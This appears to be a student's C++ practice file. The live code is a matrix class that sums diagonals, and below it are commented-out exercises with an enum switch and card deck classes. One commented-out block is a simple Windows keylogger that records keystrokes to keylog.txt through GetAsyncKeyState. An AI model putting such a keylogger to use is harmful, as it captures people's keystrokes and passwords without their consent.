#include <iostream>
using namespace std;

// Base class
class Matrix {
protected:
    int size;
    int** data;

public:
    Matrix(int size) : size(size) {
        data = new int* [size];
        for (int i = 0; i < size; ++i) {
            data[i] = new int[size];
            for (int j = 0; j < size; ++j) {
                data[i][j] = 0;
            }
        }
    }

    virtual ~Matrix() {
        for (int i = 0; i < size; ++i) {
            delete[] data[i];
        }
        delete[] data;
    }

    virtual int leftDiagonalSum() = 0;
    virtual int rightDiagonalSum() = 0;

    void setElement(int i, int j, int value) {
        data[i][j] = value;
    }

    int getElement(int i, int j) const {
        return data[i][j];
    }
};

// Derived class
class SquareMatrix : public Matrix {
public:
    SquareMatrix(int size) : Matrix(size) {}

    int leftDiagonalSum() override {
        int sum = 0;
        for (int i = 0; i < size; ++i) {
            sum += data[i][i];
        }
        return sum;
    }

    int rightDiagonalSum() override {
        int sum = 0;
        for (int i = 0; i < size; ++i) {
            sum += data[i][size - i - 1];
        }
        return sum;
    }
};

int main() {
    const int size = 5;
    SquareMatrix matrix(size);

    // Example matrix
    int counter = 1;
    for (int i = 0; i < size; ++i) {
        for (int j = 0; j < size; ++j) {
            matrix.setElement(i, j, counter++);
        }
    }

    // Calculate and print the sum of left diagonal
    cout << "Left diagonal sum: " << matrix.leftDiagonalSum() << endl;

    // Calculate and print the sum of right diagonal
    cout << "Right diagonal sum: " << matrix.rightDiagonalSum() << endl;

    return 0;
}



//#include <iostream>
//using namespace std;
//
//int main()
//{
//	enum family{uzair=1,shafaq=2,shahida=3,zafar=4 ,muneed_bhai=6,noman=7};
//	family members;
//	int enter;
//	cout << "Enter the number of the family member";
//	cin >> enter;
//	if (enter >= uzair && enter <=noman)
//	{
//		members = static_cast<family>(enter);
//
//		switch (members)
//		{
//        case uzair:
//            cout << "Selected uzair" << endl;
//            break;
//        case shafaq:
//            cout << "Selected shafaq" << endl;
//            break;
//        case shahida:
//            cout << "Selected shahida" << endl;
//            break;
//        case zafar:
//            cout << "Selected zafar" << endl;
//            break;
//        case muneed_bhai:
//            cout << "Selected muneed_bhai" << endl;
//            break;
//        case noman:
//            cout << "Selected noman" << endl;
//            break;
//        default:
//            cout << "Invalid selection" << endl;
//            break;
//		}
//	}
//}




//#include <Windows.h>
//#include <stdio.h>
//
//#define LOG_FILE "keylog.txt"
//
//int main() {
//    FILE* logfile;
//    char key;
//
//    if (fopen_s(&logfile, LOG_FILE, "a") != 0) {
//        fprintf(stderr, "Error: Could not open log file.\n");
//        return 1;
//    }
//
//    while (1) {
//        Sleep(10); // sleep for 10 milliseconds to reduce CPU usage
//        for (key = 8; key <= 255; key++) {
//            if (GetAsyncKeyState(key) == -32767) {
//                fprintf(logfile, "%c", key);
//            }
//        }
//        fflush(logfile);
//    }
//
//    fclose(logfile);
//
//    return 0;
//}







//#include <iostream>
//#include <cstdlib>
//
//using namespace std;
//
//class Card {
//public:
//    string Suit;
//    string Value;
//
//    Card(string suit, string value) : Suit(suit), Value(value) {}
//};
//
//class Deck {
//private:
//    static const int numOfSuits = 4;
//    static const int numOfValues = 13;
//    Card** cards;
//    int currentIndex;
//
//public:
//    Deck() {
//        cards = new Card * [numOfSuits * numOfValues];
//        currentIndex = 0;
//        string suits[] = { "Spades", "Hearts", "Diamonds", "Clubs" };
//        string values[] = { "A", "2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K" };
//
//        for (int i = 0; i < numOfSuits; i++) {
//            for (int j = 0; j < numOfValues; j++) {
//                cards[currentIndex++] = new Card(suits[i], values[j]);
//            }
//        }
//    }
//
//    void shuffle() {
//        srand(time(0));
//        for (int i = numOfSuits * numOfValues - 1; i > 0; i--) {
//            int j = rand() % (i + 1);
//            Card* temp = cards[i];
//            cards[i] = cards[j];
//            cards[j] = temp;
//        }
//    }
//
//    Card* deal() {
//        if (currentIndex == 0) {
//            return nullptr;
//        }
//        return cards[--currentIndex];
//    }
//
//    bool isEmpty() const {
//        return currentIndex == 0;
//    }
//
//    void display() const {
//        for (int i = 0; i < currentIndex; i++) {
//            cout << "The " << cards[i]->Value << " of " << cards[i]->Suit << endl;
//        }
//    }
//
//    ~Deck() {
//        for (int i = 0; i < numOfSuits * numOfValues; i++) {
//            delete cards[i];
//        }
//        delete[] cards;
//    }
//};
//
//class Player {
//private:
//    Card** hand;
//    int currentIndex;
//
//public:
//    Player() {
//        hand = new Card * [52];
//        currentIndex = 0;
//    }
//
//    void addCard(Card* card) {
//        hand[currentIndex++] = card;
//    }
//
//    void displayHand() const {
//        for (int i = 0; i < currentIndex; i++) {
//            cout << "The " << hand[i]->Value << " of " << hand[i]->Suit << endl;
//        }
//    }
//
//    ~Player() {
//        delete[] hand;
//    }
//};
//
//int main() {
//    Deck deck;
//    deck.shuffle();
//    cout << "Dealing 5 cards:" << endl;
//    for (int i = 0; i < 5; i++) {
//        Card* dealtCard = deck.deal();
//        if (dealtCard != nullptr) {
//            cout << "Dealt: The " << dealtCard->Value << " of " << dealtCard->Suit << endl;
//        }
//    }
//
//    Player player1;
//    for (int i = 0; i < 5; i++) {
//        Card* dealtCard = deck.deal();
//        if (dealtCard != nullptr) {
//            player1.addCard(dealtCard);
//        }
//    }
//    cout << "Player's hand:" << endl;
//    player1.displayHand();
//
//    return 0;
//}






//#include <iostream>
//#include <string>
//
//using namespace std;
//
//class Card {
//public:
//    enum class Suit {
//        Spades, Hearts, Diamonds, Clubs
//    };
//
//    enum class Value {
//        Ace, Two, Three, Four, Five, Six, Seven, Eight, Nine, Ten, Jack, Queen, King
//    };
//
//    Card(Suit suit, Value value) : suit(suit), value(value) {}
//
//    void display() const {
//        string suitStr;
//        switch (suit) {
//        case Suit::Spades:
//            suitStr = "Spades";
//            break;
//        case Suit::Hearts:
//            suitStr = "Hearts";
//            break;
//        case Suit::Diamonds:
//            suitStr = "Diamonds";
//            break;
//        case Suit::Clubs:
//            suitStr = "Clubs";
//            break;
//        }
//
//        string valueStr;
//        switch (value) {
//        case Value::Ace:
//            valueStr = "Ace";
//            break;
//        case Value::Two:
//            valueStr = "2";
//            break;
//        case Value::Three:
//            valueStr = "3";
//            break;
//        case Value::Four:
//            valueStr = "4";
//            break;
//        case Value::Five:
//            valueStr = "5";
//            break;
//        case Value::Six:
//            valueStr = "6";
//            break;
//        case Value::Seven:
//            valueStr = "7";
//            break;
//        case Value::Eight:
//            valueStr = "8";
//            break;
//        case Value::Nine:
//            valueStr = "9";
//            break;
//        case Value::Ten:
//            valueStr = "10";
//            break;
//        case Value::Jack:
//            valueStr = "Jack";
//            break;
//        case Value::Queen:
//            valueStr = "Queen";
//            break;
//        case Value::King:
//            valueStr = "King";
//            break;
//        }
//
//        cout << valueStr << " of " << suitStr << endl;
//    }
//
//private:
//    Suit suit;
//    Value value;
//};
//
//int main() {
//    Card aceOfSpades(Card::Suit::Spades, Card::Value::Ace);
//    aceOfSpades.display();
//
//    Card sevenOfHearts(Card::Suit::Hearts, Card::Value::Seven);
//    sevenOfHearts.display();
//
//    return 0;
//}
